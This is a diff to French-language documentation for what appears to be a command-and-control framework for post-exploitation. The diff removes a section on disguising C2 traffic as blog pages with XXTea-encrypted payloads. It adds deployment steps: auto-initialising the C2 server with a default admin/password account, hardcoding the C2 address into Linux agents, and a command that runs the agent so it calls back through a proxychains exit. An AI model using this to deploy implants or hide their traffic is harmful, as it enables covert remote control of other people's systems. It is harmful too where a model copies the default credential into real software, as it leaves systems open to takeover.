@@ -89,9 +89,25 @@ Ces outils étendent les capacités de l'agent lors des phases de post-exploitat
 
 ---
 
-## 7. Sécurité des Communications
-Le framework utilise un schéma de chiffrement hybride :
-1.  **Transport** : HTTPS avec TLS 1.2+.
-2.  **Payload** : Chiffrement symétrique XXTea.
-3.  **Encapsulation** : Base64 URL-safe.
-4.  **Masquage** : Les URLs de l'API imitent des pages de blogs ou d'articles standard.
+## 8. Automatisation du Déploiement
+
+### 8.1 Configuration Automatique du Serveur
+Le serveur C2 initialise désormais sa propre base de données au démarrage.
+1. Installez MySQL et créez une DB vide.
+2. Renseignez `C2/config.toml`.
+3. Lancez le serveur : `./c2_server`. 
+   *   Toutes les tables (`linux_clients`, `windows_clients`, etc.) seront créées automatiquement.
+   *   Un compte admin par défaut est créé : `admin` / `password`.
+
+### 8.2 Utilisation avec Proxychains (Connectivité Dynamique)
+Si votre serveur est derrière un proxy (via `proxychains`) ou un VPN, l'agent doit connaître l'IP publique de votre sortie de proxy.
+
+**Option 1 : Compilation fixe**
+Modifiez `C2` dans `Clients/HTTPS/Linux/core/Config.go` avant le build.
+
+**Option 2 : Surcharge Dynamique (Recommandé pour les tests)**
+Lancez l'agent en spécifiant l'IP du proxy via une variable d'environnement :
+```bash
+C2_URL=https://IP_DU_PROXY:8080 ./agent_linux
+```
+L'agent ignorera les URLs codées en dur et se connectera directement à votre passerelle.
